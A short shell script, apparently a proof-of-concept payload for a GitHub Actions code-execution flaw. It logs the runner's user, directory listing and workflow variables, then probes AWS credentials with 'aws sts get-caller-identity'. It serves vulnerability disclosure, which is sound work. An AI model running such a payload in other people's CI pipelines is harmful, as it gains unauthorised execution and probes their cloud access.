#!/usr/bin/env sh

# This is a harmless PoC script that demonstrates the vulnerability
# by printing environment information to the logs

echo "==== GITHUB ACTIONS POC - CODE EXECUTION VERIFICATION ===="
echo "Current date: $(date)"
echo "Current user: $(whoami)"
echo "Current directory: $(pwd)"
echo "Directory listing: $(ls -la)"

echo "==== SELECTED ENVIRONMENT VARIABLES ===="
echo "GITHUB_WORKFLOW: $GITHUB_WORKFLOW"
echo "GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
echo "GITHUB_REF: $GITHUB_REF"
echo "GITHUB_SHA: $GITHUB_SHA"
echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"

echo "==== AWS IDENTITY CHECK ===="
# Try to execute AWS commands to demonstrate access level
if command -v aws >/dev/null 2>&1; then
  echo "AWS CLI is available"
  aws sts get-caller-identity || echo "Failed to execute AWS command"
else
  echo "AWS CLI not available"
fi

echo "==== END OF POC VERIFICATION ===="
